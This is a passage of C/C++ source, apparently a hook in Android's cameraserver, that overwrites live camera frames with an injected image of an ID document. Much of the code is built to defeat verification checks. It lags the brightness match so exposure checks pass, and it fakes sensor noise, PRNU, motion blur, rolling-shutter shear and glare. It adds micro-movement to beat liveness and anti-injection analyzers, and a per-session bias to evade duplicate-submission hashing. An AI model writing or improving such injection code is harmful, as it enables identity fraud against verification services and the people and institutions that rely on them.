        R.y0 = cy - eff_h / 2; R.y1 = R.y0 + eff_h;
    } else {
        int eff_w = (int)(sw_rh / src_h);
        if (eff_w < 2) eff_w = 2;
        int cx = (R_outer.x0 + R_outer.x1) / 2;
        R.x0 = cx - eff_w / 2; R.x1 = R.x0 + eff_w;
        R.y0 = R_outer.y0; R.y1 = R_outer.y1;
    }

    // Per-frame budget sanity: log composite_yuv wall-time every 300 frames.
    // Target: well under the 33 ms deadline at 30 fps so cameraserver's
    // pipeline never backs up and the frame-interval variance stays flat
    // (some SDKs flag jitter as injection). Compiled unconditionally — the
    // cost is one clock_gettime pair per frame (~30 ns on arm64) + a counter.
    struct timespec _ts_a; clock_gettime(CLOCK_MONOTONIC, &_ts_a);

    // Roadmap 3.1: PRNU accumulator. On entry `dst` still holds the REAL
    // sensor frame — that's the source for the 16-frame residual map.
    prnu_accumulate(dy, dst_w, dst_h, dst_stride);
    // Lens vignette tables — cheap, rebuild only when stream dims change.
    vignette_rebuild(dst_w, dst_h);

    Ambient amb = sample_ambient_outside(dy, dvu, dst_w, dst_h, dst_stride, R);

    // Mean source Y across the dst mapping (so the brightness match accounts
    // for nn-scale sampling bias). Stride-4 subsample over the dst doc rect.
    // CRITICAL: use RECT-LOCAL coords so the whole source maps into the rect
    // regardless of where the rect sits in the frame — using full-frame coords
    // here only works if the rect spans the whole frame.
    int Rw = R.x1 - R.x0;
    int Rh = R.y1 - R.y0;
    if (Rw < 2 || Rh < 2) return;
    int64_t srcY_sum = 0; int srcY_cnt = 0;
    for (int y = R.y0; y < R.y1; y += 4) {
        int sj = (y - R.y0) * src_h / Rh;
        const uint8_t *srow = sy + (size_t)sj * src_w;
        for (int x = R.x0; x < R.x1; x += 4) {
            int si = (x - R.x0) * src_w / Rw;
            srcY_sum += srow[si]; srcY_cnt++;
        }
    }
    int srcY_mean = srcY_cnt ? (int)(srcY_sum / srcY_cnt) : 128;
    if (srcY_mean < 1) srcY_mean = 1;

    // AE-ramp lag: physical cards "settle in" to a new exposure one frame
    // after the ISP metadata ramps (the ISP's AE loop converges first; the
    // displayed-pixel response lags by its own temporal filter). A doc that
    // ALWAYS perfectly tracks the current ambient is itself a tell — the
    // PDL check compares (exposure·ISO) vs delivered mean-luma. We lag the
    // scale target by 1 frame by driving it off the PREVIOUS frame's
    // sampled ambient instead of the current frame's. Rolling 2-slot store.
    static int g_amb_prev[2] = {128, 128};
    static int g_amb_idx     = 0;
    int lagged_amb_Y = g_amb_prev[1 - g_amb_idx];   // 1 frame old
    g_amb_prev[g_amb_idx] = amb.mean_Y;
    g_amb_idx = 1 - g_amb_idx;

    // Tightened clamp 0.4x..1.4x — narrower soft-fail envelope. The ±10%
    // around ambient is achieved exactly when src is within reach; extreme
    // mismatches hit the clamp instead of producing blown-highlight tells.
    int scale_q8 = (lagged_amb_Y * 256) / srcY_mean;
    if (scale_q8 < 102) scale_q8 = 102;
    if (scale_q8 > 358) scale_q8 = 358;
    // Per-session luma bias (±10 q8 ≈ ±4 %) — small enough to stay inside
    // the ±10 % AE tolerance but large enough to de-link byte-level
    // duplicate hashes across submissions.
    scale_q8 += g_session_luma_bias_q8;
    if (scale_q8 < 32)  scale_q8 = 32;
    if (scale_q8 > 512) scale_q8 = 512;

    // Mean source chroma to compute delta toward ambient (coarse WB).
    // RECT-LOCAL mapping (same reason as luma).
    DocRect Rc = { R.x0 / 2, R.y0 / 2, R.x1 / 2, R.y1 / 2 };
    int Rcw0 = Rc.x1 - Rc.x0;
    int Rch0 = Rc.y1 - Rc.y0;
    int csrc_w0 = src_w / 2;
    int csrc_h0 = src_h / 2;
    int64_t sumF = 0, sumS = 0; int cntC = 0;
    if (Rcw0 > 0 && Rch0 > 0) {
        for (int y = Rc.y0; y < Rc.y1; y += 4) {
            int sj = (y - Rc.y0) * csrc_h0 / Rch0;
            const uint8_t *srow = svu + (size_t)sj * src_w;
            for (int x = Rc.x0; x < Rc.x1; x += 4) {
                int si = (x - Rc.x0) * csrc_w0 / Rcw0;
                sumF += srow[si * 2];
                sumS += srow[si * 2 + 1];
                cntC++;
            }
        }
    }
    int srcMeanF = cntC ? (int)(sumF / cntC) : 128;
    int srcMeanS = cntC ? (int)(sumS / cntC) : 128;
    int delta_first  = amb.mean_first  - srcMeanF;
    int delta_second = amb.mean_second - srcMeanS;

    // Step 2.4: if real COLOR_CORRECTION_GAINS reached us via the ring, use
    // them to BIAS the chroma shift toward the camera's actual white point
    // instead of relying on the coarse spatial estimate alone. Gains are
    // per-channel multipliers Camera2 applies to R, G_even, G_odd, B after
    // demosaic. In chroma-shift terms:
    //   - A > 1 R-gain pulls V (red-diff) UP, less when G-gain is also high
    //   - A > 1 B-gain pulls U (blue-diff) UP, same caveat
    // We approximate:
    //   delta_U_from_gain = k * (B_gain - G_gain_avg) * 128
    //   delta_V_from_gain = k * (R_gain - G_gain_avg) * 128
    // with k = 48 (empirical — a full "gray-world" gain of 2.0 shifts chroma
    // ~24 LSB, matching what the spatial mean sees under typical indoor
    // tungsten vs daylight). Blend 50/50 with the spatial delta so a wrong
    // real value never overrides correct spatial evidence.
    FrameMeta fm;
    bool have_meta = read_meta(frame_number, &fm);

    // ── NOTE: full WB+CCM forward application DISABLED ───────────────────
    // Experiment on 2026-11-05: applying Mat_RGB2YUV·CCM·diag_WB·Mat_YUV2RGB
    // to our source produced extreme/flickering neon colors because the
    // source is ALREADY in display-sRGB — the camera's TRANSFORM is designed
    // to turn sensor-RAW → sRGB, so running it forward on sRGB input is
    // effectively a double colour-correction. The right use would be to apply
    // the INVERSE on source (to get into raw-equivalent) then the CCM to get
    // back to sRGB — which cancels out — unless we had a DIFFERENT source
    // reference colour pipeline to bridge. For a document photo (generic
    // sRGB) the spatial mean + gain-biased mix below already lands within
    // 1-2 LSB of camera output and doesn't have this failure mode.
    //
    // Keeping the compose_color_matrix_q10 / FrameMeta.ccm plumbing intact
    // for a possible future mode that bridges source-sRGB ↔ camera-sRGB via
    // a measured reference patch (TODO).
    bool apply_ccm = false;
    int32_t M_ccm_q10[9] = {};   // dead code compile-only; see note above

    // Keep Step 2.4-a's 2:1 spatial-to-gains blend when gains are present —
    // this is the mode that passed PCE/BCES validation on myTU.
    if (have_meta && (fm.valid_mask & 8u)) {
        float g_avg = 0.5f * (fm.awb_gains[1] + fm.awb_gains[2]);
        if (g_avg < 0.1f) g_avg = 1.0f;
        int du_g = (int)(48.0f * (fm.awb_gains[3] - g_avg));   // U-like plane
        int dv_g = (int)(48.0f * (fm.awb_gains[0] - g_avg));   // V-like plane
        int du_mix = (du_g + 2 * delta_first)  / 3;
        int dv_mix = (dv_g + 2 * delta_second) / 3;
        delta_first  = du_mix;
        delta_second = dv_mix;
    }
    int yuv_order = yuv_fmt();
    bool is_nv21  = (yuv_order == 21);
    (void)is_nv21;   // unused until apply_ccm comes back

    // Noise seed: per-frame varying like a real sensor; matched to ambient σ.
    float lsig = 0.f, csig = 0.f;
    uint32_t rng = 1;
    if (nstr > 0) {
        lsig = amb.sigma * (nstr / 100.0f);
        csig = lsig * 0.6f;
        rng  = ((uint32_t)g_inject_count * 2654435761u)
               ^ (uint32_t)(uintptr_t)dy ^ 0x9e3779b9u;
        if (!rng) rng = 1;
    }

    // ── Step 4 + P1: motion-blur PSF + rolling-shutter shear ──────────────
    // Both come from the same gyro mean over the exposure window:
    //   blur = f_px · ω · T_exposure  (integrated across shutter open)
    //   shear(y) = f_px · ω · T_rolling · (y/H)  (read-order delay)
    int   N_taps  = 1;
    float dsx_tap = 0.f, dsy_tap = 0.f;
    int   shear_src_dx[SHEAR_BANDS] = {}; // horizontal source-pixel offset per band (yaw)
    int   shear_src_dy[SHEAR_BANDS] = {}; // vertical   source-pixel offset per band (pitch)
    bool  shear_active = false;
    if (have_meta && (fm.valid_mask & 3u) == 3u) {   // ts + exp both valid
        uint64_t t_end   = fm.timestamp_ns;
        uint64_t t_start = (fm.exposure_ns < t_end) ? t_end - fm.exposure_ns : 0;
        float focal = (fm.valid_mask & 0x10u) ? fm.focal_length_mm : 0.f;
        MotionParams mp;
        if (compute_motion(t_start, t_end, dst_w, focal, &mp)) {
            if (mp.worth_blur) {
                // |d| ≥ 0.5 px — pick N = clamp(ceil(|d|), 2, 32)
                float mag2 = mp.dx_blur * mp.dx_blur + mp.dy_blur * mp.dy_blur;
                int mag_i  = 1;
                // Cap at 8 — past that, directional blur is visually indistin-
                // guishable but inner-loop cost scales linearly. Previously 32
                // which dominated the 1920×1080 luma budget during hand-hold
                // motion (|d| ≈ 30 px → N=32 → 70 ms just in tap sampling).
                while ((mag_i * mag_i) < mag2 && mag_i < 8) mag_i++;
                N_taps = mag_i < 2 ? 2 : (mag_i > 8 ? 8 : mag_i);
                dsx_tap = mp.dx_blur * (float)src_w / ((float)Rw * (float)N_taps);
                dsy_tap = mp.dy_blur * (float)src_h / ((float)Rh * (float)N_taps);
            }
            // P1 rolling shutter: per-band offsets in SOURCE-pixel units.
            // Shear is sensor-pixel offset = f_px · ω · T_ROLLING · (row/H),
            // scaled to source coords via src_w/Rw, src_h/Rh. Even a slight
            // yaw at full-frame readout (35 ms) can produce >5 px shear at
            // the bottom row — enough for an analyzer to resolve.
            float roll_x = mp.f_px * mp.wy * T_ROLLING_SEC / (float)dst_h;
            float roll_y = mp.f_px * mp.wx * T_ROLLING_SEC / (float)dst_h;
            float x_src_scale = (float)src_w / (float)Rw;
            float y_src_scale = (float)src_h / (float)Rh;
            // Peak shear at the TOP or BOTTOM of the doc rect — if it clears
            // ≥ 1 px at those extremes, enable.
            float peak_top    = fabs_fast(roll_x * (float)R.y0) * x_src_scale;
            float peak_bottom = fabs_fast(roll_x * (float)R.y1) * x_src_scale;
            if (peak_top >= 1.0f || peak_bottom >= 1.0f ||
                fabs_fast(roll_y * (float)R.y1) * y_src_scale >= 1.0f) {
                shear_active = true;
                for (int b = 0; b < SHEAR_BANDS; b++) {
                    float row_mid = (float)R.y0 +
                                    ((float)b + 0.5f) * (float)Rh / (float)SHEAR_BANDS;
                    shear_src_dx[b] = (int)(roll_x * row_mid * x_src_scale);
                    shear_src_dy[b] = (int)(roll_y * row_mid * y_src_scale);
                }
            }

            // Integrate tilt into the specular drift (assume ~30 fps between
            // composite calls; close enough — the decay term dominates the
            // steady-state position anyway). `wy` tilts the specular LEFT/
            // RIGHT, `wx` moves it UP/DOWN in rect coords.
            const float dt = 1.0f / 30.0f;
            g_spec_dx += mp.wy * SPECULAR_TILT_GAIN * dt;
            g_spec_dy += mp.wx * SPECULAR_TILT_GAIN * dt;
        }
    }
    // Decay back toward centre every frame, even when no gyro samples are
    // available (motion gating above may have failed).
    g_spec_dx *= SPECULAR_DECAY;
    g_spec_dy *= SPECULAR_DECAY;
    if (g_spec_dx >  SPECULAR_CLAMP) g_spec_dx =  SPECULAR_CLAMP;
    if (g_spec_dx < -SPECULAR_CLAMP) g_spec_dx = -SPECULAR_CLAMP;
    if (g_spec_dy >  SPECULAR_CLAMP) g_spec_dy =  SPECULAR_CLAMP;
    if (g_spec_dy < -SPECULAR_CLAMP) g_spec_dy = -SPECULAR_CLAMP;

    // Precompute specular ellipse: centre in SENSOR coords, Gaussian-ish
    // ((1 − r²)² where r² = ((x−cx)/a)² + ((y−cy)/b)²), peak uplift tied to
    // ambient mean+σ. Zero cost when Rw/Rh too small for a sensible blob.
    // Per-session glare bias: offsets the "virtual light" position so the
    // same tilt motion produces a different specular path than last session.
    float spec_cx    = (R.x0 + R.x1) * 0.5f
                     + (g_spec_dx + g_session_spec_dx_bias) * 0.5f * (float)Rw;
    float spec_cy    = (R.y0 + R.y1) * 0.5f
                     + (g_spec_dy + g_session_spec_dy_bias) * 0.5f * (float)Rh;
    float spec_a     = SPECULAR_A_NORM * (float)Rw;
    float spec_b     = SPECULAR_B_NORM * (float)Rh;
    float spec_inv_a = spec_a > 1.f ? 1.0f / spec_a : 0.f;
    float spec_inv_b = spec_b > 1.f ? 1.0f / spec_b : 0.f;
    int   spec_peak  = (int)((amb.mean_Y + 8.0f * amb.sigma) * SPECULAR_STRENGTH);
    bool  spec_active = spec_inv_a > 0.f && spec_inv_b > 0.f && spec_peak > 0;
    // Bounding box so most rows/cols can skip the float distance math.
    int   spec_y0    = spec_active ? (int)(spec_cy - spec_b) : 0;
    int   spec_y1    = spec_active ? (int)(spec_cy + spec_b) + 1 : 0;
    int   spec_x0    = spec_active ? (int)(spec_cx - spec_a) : 0;
    int   spec_x1    = spec_active ? (int)(spec_cx + spec_a) + 1 : 0;

    // Precompute per-Y shot-noise σ = lsig·SHOT_NOISE_SCALE·√(Y/128) so the
    // luma hot loop costs ONE float table read instead of 3 mults + 1 div.
    float sig_lut[256];
    {
        float sig_base = lsig * SHOT_NOISE_SCALE * (1.0f / 11.3137f);
        for (int k = 0; k < 256; k++) sig_lut[k] = sig_base * (float)SQRT_LUT[k];
    }

    // ── Micro-movement (anti-static-detection) ─────────────────────────────
    // Liveness / anti-injection analyzers check for frame-to-frame variation.
    // A perfectly static injected image fails.  We add a slow sinusoidal
    // sub-pixel drift (period ~3 s, amplitude ~1.5 px) to the source
    // sampling so the ID text stays sharp (motion blur already handles
    // fast motion) while the frame content visibly "breathes".
    // g_inject_count is per-frame and monotonically increasing, so sin/cos
    // of (count * step) gives a smooth, non-repeating trajectory.
    const float MICRO_AMP  = 1.5f;          // pixels (source space)
    const float MICRO_STEP = 0.003f;        // radians per frame (~3 s period at 30 fps)
    float micro_phase = (float)g_inject_count * MICRO_STEP;
    // Two independent sinusoids (different frequencies) for x and y so the
    // path is Lissajous-like, not a simple circle.
    int micro_dx = (int)(MICRO_AMP * sinf(micro_phase));
    int micro_dy = (int)(MICRO_AMP * sinf(micro_phase * 1.37f + 0.7f));
    // Clamp to ±1 source pixel to avoid OOB; the clamp below handles the rest.

    // Precompute si_lut[x] = (x - R.x0) * src_w / Rw once per frame — kills
    // the per-pixel integer divide, which was ~30 cycles / pixel on arm64.
    // Luma loop now reads `si_lut[x] + shear_dx + micro_dx`.
    int *si_lut = (int *)alloca(sizeof(int) * (size_t)(Rw + 1));
    for (int x = 0; x < Rw; x++) si_lut[x] = x * src_w / Rw + micro_dx;
    // Chroma analogue (half-res).
    int Rcw = Rc.x1 - Rc.x0;
    int *si_c_lut = (int *)alloca(sizeof(int) * (size_t)(Rcw + 1));
    for (int x = 0; x < Rcw; x++) si_c_lut[x] = x * csrc_w0 / (Rcw > 0 ? Rcw : 1) + (micro_dx >> 1);

    struct timespec _ts_pre; clock_gettime(CLOCK_MONOTONIC, &_ts_pre);

    // LUMA — iterate doc rect only; alpha-feather near rect edges; read dst
    // for the real-side of the blend (dst still has the real frame here).
    // RECT-LOCAL mapping: source spans rect fully regardless of rect position.
    // When N_taps > 1 each output pixel averages N source samples along the
    // motion vector — the directional blur that matches real exposure.
    for (int y = R.y0; y < R.y1; y++) {
        int sj_base = (y - R.y0) * src_h / Rh + micro_dy;
        // P1: which shear band is this row in?
        int band = shear_active
                 ? ((y - R.y0) * SHEAR_BANDS / Rh)
                 : 0;
        int shear_dx = shear_active ? shear_src_dx[band] : 0;
        int shear_dy = shear_active ? shear_src_dy[band] : 0;
        int sj = sj_base + shear_dy;
        if (sj < 0) sj = 0; else if (sj >= src_h) sj = src_h - 1;
        uint8_t *drow = dy + (size_t)y * dst_stride;
        for (int x = R.x0; x < R.x1; x++) {
            int si = si_lut[x - R.x0] + shear_dx;
            if (si < 0) si = 0; else if (si >= src_w) si = src_w - 1;
            int ysrc;
            if (N_taps <= 1) {
                ysrc = sy[(size_t)sj * src_w + si];
            } else {
                int sum = 0, cnt = 0;
                int half = N_taps / 2;
                for (int t = -half; t <= half; t++) {
                    int si_t = si + (int)(t * dsx_tap);
                    int sj_t = sj + (int)(t * dsy_tap);
                    if (si_t < 0) si_t = 0; else if (si_t >= src_w) si_t = src_w - 1;
                    if (sj_t < 0) sj_t = 0; else if (sj_t >= src_h) sj_t = src_h - 1;
                    sum += sy[(size_t)sj_t * src_w + si_t];
                    cnt++;
                }
                ysrc = cnt > 0 ? sum / cnt : 128;
            }
            int yscaled = (ysrc * scale_q8 + 128) >> 8;
            // Specular sheen — bounding-box early-out so most pixels skip
            // the float math entirely; only inside the ellipse's bbox do
            // we evaluate the (1−r²)² falloff.
            if (spec_active && y >= spec_y0 && y < spec_y1 &&
                x >= spec_x0 && x < spec_x1) {
                float dxn = ((float)x - spec_cx) * spec_inv_a;
                float dyn = ((float)y - spec_cy) * spec_inv_b;
                float r2  = dxn * dxn + dyn * dyn;
                if (r2 < 1.0f) {
                    float fall = 1.0f - r2;
                    float add  = (float)spec_peak * fall * fall;
                    yscaled += (int)add;
                    if (yscaled > 255) yscaled = 255;
                }
            }
            int yvign   = apply_vignette(yscaled, x, y);
            int yprnu   = apply_prnu_mult(yvign, x, y);
            int yclamp  = yprnu < 0 ? 0 : (yprnu > 255 ? 255 : yprnu);
            // Per-Y shot-noise σ from the precomputed LUT — one table read.
            int ycomp   = clamp255(yprnu + nz(rng, sig_lut[yclamp]));
            int alpha   = feather_alpha(x, y, R);
            int yreal   = drow[x];
            drow[x] = (uint8_t)(((alpha * ycomp) + ((256 - alpha) * yreal)) >> 8);
        }
    }

    struct timespec _ts_mid; clock_gettime(CLOCK_MONOTONIC, &_ts_mid);

    // CHROMA — half-res; feather uses the LUMA rect (via 2x coords) so the
    // feather width stays visually consistent across planes. RECT-LOCAL too.
    // Blur taps at half the luma per-tap offset (chroma is half-res).
    if (Rcw0 >= 1 && Rch0 >= 1) {
    float dcx_tap = dsx_tap * 0.5f;
    float dcy_tap = dsy_tap * 0.5f;
    for (int y = Rc.y0; y < Rc.y1; y++) {
        int sj_base = (y - Rc.y0) * csrc_h0 / Rch0 + (micro_dy >> 1);
        // P1: shear band keyed by the LUMA rect coords (chroma is at ½-res,
        // so the equivalent luma row is y*2; same band table applies).
        int band = shear_active
                 ? ((y * 2 - R.y0) * SHEAR_BANDS / Rh)
                 : 0;
        if (band < 0) band = 0; else if (band >= SHEAR_BANDS) band = SHEAR_BANDS - 1;
        int shear_dx_c = shear_active ? (shear_src_dx[band] >> 1) : 0;  // ½-res
        int shear_dy_c = shear_active ? (shear_src_dy[band] >> 1) : 0;
        int sj = sj_base + shear_dy_c;
        if (sj < 0) sj = 0; else if (sj >= csrc_h0) sj = csrc_h0 - 1;
        uint8_t *drow = dvu + (size_t)y * dst_stride;
        for (int x = Rc.x0; x < Rc.x1; x++) {
            int si = si_c_lut[x - Rc.x0] + shear_dx_c;
            if (si < 0) si = 0; else if (si >= csrc_w0) si = csrc_w0 - 1;
            int sF, sS;
            if (N_taps <= 1) {
                sF = svu[(size_t)sj * src_w + si * 2];
                sS = svu[(size_t)sj * src_w + si * 2 + 1];
            } else {
                int sumF = 0, sumS = 0, cnt = 0;
                int half = N_taps / 2;
                for (int t = -half; t <= half; t++) {
                    int si_t = si + (int)(t * dcx_tap);
                    int sj_t = sj + (int)(t * dcy_tap);
                    if (si_t < 0) si_t = 0; else if (si_t >= csrc_w0) si_t = csrc_w0 - 1;
                    if (sj_t < 0) sj_t = 0; else if (sj_t >= csrc_h0) sj_t = csrc_h0 - 1;
                    sumF += svu[(size_t)sj_t * src_w + si_t * 2];
                    sumS += svu[(size_t)sj_t * src_w + si_t * 2 + 1];
                    cnt++;
                }
                sF = cnt > 0 ? sumF / cnt : 128;
                sS = cnt > 0 ? sumS / cnt : 128;
            }
            int sF_cc, sS_cc;
            if (apply_ccm) {
                // Read Y from the just-composited DST luma block (top-left of
                // this 2×2 chroma pixel's luma tile). Keeps M·(Y,Uc,Vc) honest
                // against the luma we actually wrote (which includes PRNU +
                // vignette + ambient-mean scale already).
                int yrow = (y * 2 < dst_h) ? (y * 2) : (dst_h - 1);
                int xcol = (x * 2 < dst_w) ? (x * 2) : (dst_w - 1);
                int Y_src  = dy[(size_t)yrow * dst_stride + xcol];
                int U_cent = (is_nv21 ? sS : sF) - 128;
                int V_cent = (is_nv21 ? sF : sS) - 128;
                // Apply row 1 (chroma Uc) + row 2 (chroma Vc) of M_ccm_q10.
                // Skip row 0 (luma) — luma was already done elsewhere.
                int Uc_cam = (M_ccm_q10[3]*Y_src + M_ccm_q10[4]*U_cent + M_ccm_q10[5]*V_cent + 512) >> 10;
                int Vc_cam = (M_ccm_q10[6]*Y_src + M_ccm_q10[7]*U_cent + M_ccm_q10[8]*V_cent + 512) >> 10;
                int U_byte = clamp255(Uc_cam + 128);
                int V_byte = clamp255(Vc_cam + 128);
                sF_cc = is_nv21 ? V_byte : U_byte;
                sS_cc = is_nv21 ? U_byte : V_byte;
            } else {
                // Fallback: coarse spatial mean shift (pre-Step-2.4-ccm path).
                sF_cc = clamp255(sF + ((delta_first  * WB_WEIGHT_Q8) >> 8));
                sS_cc = clamp255(sS + ((delta_second * WB_WEIGHT_Q8) >> 8));
            }
            int fComp = clamp255(sF_cc + nz(rng, csig));
            int sComp = clamp255(sS_cc + nz(rng, csig));
            int alpha = feather_alpha_c(x, y, Rc);
            int rF = drow[x * 2];
            int rS = drow[x * 2 + 1];
            drow[x * 2]     = (uint8_t)(((alpha * fComp) + ((256 - alpha) * rF)) >> 8);
            drow[x * 2 + 1] = (uint8_t)(((alpha * sComp) + ((256 - alpha) * rS)) >> 8);
        }
    }
    } // end `if (Rcw0 >= 1 && Rch0 >= 1)` chroma block

    // Content-PAD: paper-fibre texture + laminate specular pinpoints on top of
    // the injected rect R (NOT R_outer — we don't want to touch the physical-
    // tunnel pass-through pixels). After chroma so the fibre noise lands on
    // the final luma the SDK's micro-texture histogram will sample. Call sits
    // inside the dump capture below so PCE/BCES recordings include the PAD
    // signal — essential for validation of the defense itself.
    {
        int pad_s = content_pad_strength();
        if (pad_s > 0) apply_content_pad(dy, dst_stride, R, rng, pad_s);
    }

    // PCE/BCES validation capture — dump the final post-composite buffer
    // when ctrl_dump has a positive countdown. One file per frame, numbered
    // from (n-1) down to 0 so Python glob picks them up in reverse time.
    int n = dump_consume_one();
    if (n > 0) {
        LOGD("dump_dst #%d: %dx%d stride=%d", n - 1, dst_w, dst_h, dst_stride);
        dump_dst(dy, dst_w, dst_h, dst_stride, n - 1);
    }

    // Budget log: decompose into SETUP (everything before the luma loop:
    // prnu_accumulate, sample_ambient_outside, source-mean computes,
    // motion-blur + shear setup, sig_lut precompute), LUMA write loop,
    // and CHROMA write loop. Printed every 300 frames so we can see which
    // stage dominates the 33 ms / 30 fps deadline.
    struct timespec _ts_b; clock_gettime(CLOCK_MONOTONIC, &_ts_b);
    auto ns_of = [](const timespec &a, const timespec &b) -> int64_t {
        int64_t d = (int64_t)(b.tv_sec - a.tv_sec) * 1000000000LL
                  + ((int64_t)b.tv_nsec - (int64_t)a.tv_nsec);
        return d < 0 ? 0 : d;
    };
    int64_t ns_setup  = ns_of(_ts_a, _ts_pre);
    int64_t ns_luma   = ns_of(_ts_pre, _ts_mid);
    int64_t ns_chroma = ns_of(_ts_mid, _ts_b);
    int64_t ns_total  = ns_of(_ts_a, _ts_b);
    static int64_t  g_bud_sum = 0, g_bud_max = 0;
    static int64_t  g_sum_setup = 0, g_sum_luma = 0, g_sum_chroma = 0;
    static uint32_t g_bud_cnt = 0;
    g_bud_sum    += ns_total;
    g_sum_setup  += ns_setup;
    g_sum_luma   += ns_luma;
    g_sum_chroma += ns_chroma;
    if (ns_total > g_bud_max) g_bud_max = ns_total;
    if (++g_bud_cnt >= 300) {
        LOGD("composite_yuv budget @ %dx%d: total mean=%lld us max=%lld us  "
             "setup=%lld luma=%lld chroma=%lld us (mean)",
             dst_w, dst_h,
             (long long)(g_bud_sum    / g_bud_cnt / 1000),
             (long long)(g_bud_max    / 1000),
             (long long)(g_sum_setup  / g_bud_cnt / 1000),
             (long long)(g_sum_luma   / g_bud_cnt / 1000),
             (long long)(g_sum_chroma / g_bud_cnt / 1000));
        g_bud_sum = 0; g_bud_max = 0; g_bud_cnt = 0;
        g_sum_setup = 0; g_sum_luma = 0; g_sum_chroma = 0;
    }
}

// YUV (NV21) video: scale the source frame to the live stream's dimensions and
// copy honoring the destination row stride. The real stride comes from the
// gralloc handle (stride_hint); if unavailable we estimate from the buffer size.
// NB: assumes NV21 chroma immediately follows luma at the same row stride — the
// common gralloc layout (confirmed on this device); exotic per-plane padding is
// not handled.
static void write_yuv(int dmabuf_fd, uint32_t dst_w, uint32_t dst_h,
                      uint32_t stride_hint, const char *nv21_path,
                      const char *dim_path, uint32_t frame_number) {
    if (dst_w == 0 || dst_h == 0) return;

    int sfd = open(nv21_path, O_RDONLY);
    if (sfd < 0) return;
    struct stat st;
    if (fstat(sfd, &st) != 0 || st.st_size <= 0) { close(sfd); return; }
    size_t src_len = (size_t)st.st_size;

    void *src = mmap(NULL, src_len, PROT_READ, MAP_PRIVATE, sfd, 0);
    close(sfd);
    if (src == MAP_FAILED) return;

    uint32_t src_w = 0, src_h = 0;
    read_nv21_dim(dim_path, &src_w, &src_h);
    if (src_w == 0 || src_h == 0) { src_w = dst_w; src_h = dst_h; }
    // Bail if the file is too small for the claimed geometry (avoids OOB reads).
    if ((size_t)src_w * src_h * 3 / 2 > src_len) { munmap(src, src_len); return; }

    size_t buf_size = dmabuf_size(dmabuf_fd);
    if (buf_size == 0) { munmap(src, src_len); return; }

    // Prefer the real gralloc row stride; fall back to a size estimate.
    uint32_t dst_stride = stride_hint;
    if (dst_stride < dst_w) {
        dst_stride = (uint32_t)((buf_size * 2) / (3 * (size_t)dst_h));
        if (dst_stride < dst_w) dst_stride = dst_w;
    }

    void *dst = mmap(NULL, buf_size, PROT_READ | PROT_WRITE, MAP_SHARED, dmabuf_fd, 0);
    if (dst == MAP_FAILED) { munmap(src, src_len); return; }

    // Option-B snapshot: if the app flipped CTRL_SNAP to "1", save THIS
    // real YUV frame to disk BEFORE our composite overwrites it, then
    // reset the flag. The app re-reads real_yuv.{nv21,dim} and uses it
    // as the BLOB backdrop so the still-capture includes the actual
    // scene instead of pure black.
    {
        int sf = open(CTRL_SNAP, O_RDONLY);
        if (sf >= 0) {
            char sb[8] = {}; read(sf, sb, sizeof(sb) - 1); close(sf);
            if (sb[0] == '1') {
                int of = open(REAL_YUV, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                if (of >= 0) {
                    // Write luma, one row at a time to honour stride≠width.
                    const uint8_t *dy_r = (const uint8_t *)dst;
                    for (uint32_t j = 0; j < dst_h; j++)
                        write(of, dy_r + (size_t)j * dst_stride, dst_w);
                    const uint8_t *dvu_r = dy_r + (size_t)dst_stride * dst_h;
                    for (uint32_t j = 0; j < dst_h / 2; j++)
                        write(of, dvu_r + (size_t)j * dst_stride, dst_w);
                    close(of);
                    // cameraserver's umask is 0077 — explicit chmod 0644 so
                    // the APP (different uid) can read it back. Same for .dim.
                    chmod(REAL_YUV, 0644);
                    int df = open(REAL_DIM, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                    if (df >= 0) {
                        char d[32]; int n = snprintf(d, sizeof(d), "%ux%u", dst_w, dst_h);
                        write(df, d, (size_t)n); close(df);
                        chmod(REAL_DIM, 0644);
                    }
                    // Reset the trigger so the next write_yuv is normal.
                    sf = open(CTRL_SNAP, O_WRONLY | O_TRUNC);
                    if (sf >= 0) { write(sf, "0", 1); close(sf); }
                    LOGD("snap_yuv: dumped %ux%u real YUV to %s", dst_w, dst_h, REAL_YUV);
                }
            }
        }
    }

    // Compositor mode (Step 1): region overwrite + ambient match + feather.
    // Keeps the rest of the real frame intact. Falls through to the legacy
    // full-overwrite path when disabled (ctrl_composite absent or "0").
    if (composite_enabled()) {
        composite_yuv(dst, (const uint8_t *)src, (int)src_w, (int)src_h,
                      (int)dst_w, (int)dst_h, (int)dst_stride, noise_strength(),
                      frame_number);
        munmap(dst, buf_size);
        munmap(src, src_len);
        return;
    }

    const uint8_t *sy  = (const uint8_t *)src;
    const uint8_t *svu = sy + (size_t)src_w * src_h;
    uint8_t *dy  = (uint8_t *)dst;
    uint8_t *dvu = dy + (size_t)dst_stride * dst_h;

    // Measure the live sensor noise from the REAL frame still in dst (do this
    // BEFORE any write overwrites it), then derive per-channel sigma + a per-frame
    // PRNG seed so the injected grain varies frame-to-frame like a real sensor.
    int   nstr = noise_strength();
    float lsig = 0.f, csig = 0.f;
    uint32_t rng = 1;
    if (nstr > 0) {
        lsig = estimate_luma_sigma(dy, dst_w, dst_h, dst_stride) * (nstr / 100.0f);
        csig = lsig * 0.6f;                         // chroma noise ~0.6x luma
        rng  = ((uint32_t)g_inject_count * 2654435761u)
               ^ (uint32_t)(uintptr_t)dy ^ 0x9e3779b9u;
        if (!rng) rng = 1;
    }

    // Luma (nearest-neighbour scale + matched grain)
    for (uint32_t y = 0; y < dst_h; y++) {
        const uint8_t *srow = sy + (size_t)(y * src_h / dst_h) * src_w;
        uint8_t *drow = dy + (size_t)y * dst_stride;
        for (uint32_t x = 0; x < dst_w; x++)
            drow[x] = (uint8_t)clamp255((int)srow[x * src_w / dst_w] + nz(rng, lsig));
    }
    // Chroma (interleaved V,U at half resolution + matched grain)
    uint32_t cdw = dst_w / 2, cdh = dst_h / 2;
    uint32_t csw = src_w / 2, csh = src_h / 2;
    for (uint32_t y = 0; y < cdh; y++) {
        const uint8_t *srow = svu + (size_t)(csh ? y * csh / cdh : 0) * src_w;
        uint8_t *drow = dvu + (size_t)y * dst_stride;
        for (uint32_t x = 0; x < cdw; x++) {
            uint32_t sx = (csw ? x * csw / cdw : 0);
            drow[x * 2]     = (uint8_t)clamp255((int)srow[sx * 2]     + nz(rng, csig)); // V
            drow[x * 2 + 1] = (uint8_t)clamp255((int)srow[sx * 2 + 1] + nz(rng, csig)); // U
        }
    }
    munmap(dst, buf_size);
    munmap(src, src_len);
}

// ─── Hook replacement ─────────────────────────────────────────────────────
//
